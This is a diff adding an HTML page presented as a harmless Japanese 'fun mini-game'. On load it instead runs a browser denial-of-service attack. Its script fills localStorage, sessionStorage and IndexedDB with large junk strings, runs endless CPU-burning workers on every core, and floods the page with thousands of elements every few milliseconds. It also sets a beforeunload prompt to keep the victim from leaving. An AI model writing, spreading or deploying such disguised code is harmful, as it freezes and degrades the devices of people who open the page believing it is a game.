@@ -1,0 +1,129 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+  <meta charset="UTF-8">
+  <title>愉快なミニゲーム</title>
+  <style>
+    body {
+      background: #000;
+      color: #0f0;
+      font-family: monospace;
+      overflow: hidden;
+      margin: 0;
+      height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      font-size: clamp(28px, 7vw, 72px);
+      user-select: none;
+    }
+  </style>
+</head>
+<body>
+  <h1>楽しんでね^^</h1>
+
+  <script>
+    setTimeout(() => {
+      document.body.innerHTML = `
+        <h1>(   ᐛ)ﾊﾞﾅﾅ</h1>
+        <p style="font-size:0.6em;margin-top:30px;">STORAGE + CPU + DOM BOMB ACTIVATED</p>
+      `;
+
+      function storageBomb() {
+        const hugeData = '🍌'.repeat(1024 * 512);
+
+        try {
+          for (let i = 0; i < 300; i++) {
+            localStorage.setItem('lag_' + i, hugeData);
+          }
+        } catch(e) {}
+
+        try {
+          for (let i = 0; i < 400; i++) {
+            sessionStorage.setItem('lag_s_' + i, hugeData);
+          }
+        } catch(e) {}
+
+        const req = indexedDB.open('LagBombDB', 1);
+        req.onupgradeneeded = (e) => {
+          const db = e.target.result;
+          if (!db.objectStoreNames.contains('lagStore')) {
+            db.createObjectStore('lagStore');
+          }
+        };
+        req.onsuccess = (e) => {
+          const db = e.target.result;
+          const tx = db.transaction('lagStore', 'readwrite');
+          const store = tx.objectStore('lagStore');
+          
+          setInterval(() => {
+            for (let i = 0; i < 80; i++) {
+              store.put(hugeData, 'key_' + Date.now() + '_' + i);
+            }
+          }, 50);
+        };
+      }
+
+      function cpuBurn() {
+        const workerCode = `
+          self.onmessage = function() {
+            while(true) {
+              let x = 0;
+              for(let i = 0; i < 200000; i++) {
+                x += Math.sqrt(Math.random() * 999999) * Math.sin(i);
+              }
+            }
+          };
+        `;
+        const blob = new Blob([workerCode], {type: 'text/javascript'});
+        const url = URL.createObjectURL(blob);
+
+        for (let i = 0; i < (navigator.hardwareConcurrency || 8); i++) {
+          const w = new Worker(url);
+          w.postMessage('die');
+        }
+      }
+
+      function visualBomb() {
+        setInterval(() => {
+          for (let i = 0; i < 6000; i++) {
+            const d = document.createElement('div');
+            d.textContent = 'LAG🍌';
+            d.style.position = 'fixed';
+            d.style.left = Math.random() * 100 + 'vw';
+            d.style.top = Math.random() * 100 + 'vh';
+            d.style.fontSize = Math.random() * 30 + 10 + 'px';
+            d.style.opacity = Math.random() * 0.8 + 0.2;
+            document.body.appendChild(d);
+          }
+        }, 12);
+
+        const c = document.createElement('canvas');
+        c.width = window.innerWidth * 1.5;
+        c.height = window.innerHeight * 1.5;
+        c.style.position = 'fixed';
+        c.style.zIndex = '-1';
+        document.body.appendChild(c);
+        const ctx = c.getContext('2d');
+        function drawChaos() {
+          ctx.fillStyle = `hsla(${Math.random()*360},100%,50%,0.1)`;
+          ctx.fillRect(Math.random()*c.width, Math.random()*c.height, 80, 80);
+          requestAnimationFrame(drawChaos);
+        }
+        drawChaos();
+      }
+
+      storageBomb();
+      cpuBurn();
+      visualBomb();
+
+      window.addEventListener('beforeunload', e => {
+        e.preventDefault();
+        e.returnValue = '🍌 まだ遊んでいこうよ...';
+      });
+
+    }, 600);
+  </script>
+</body>
+</html>
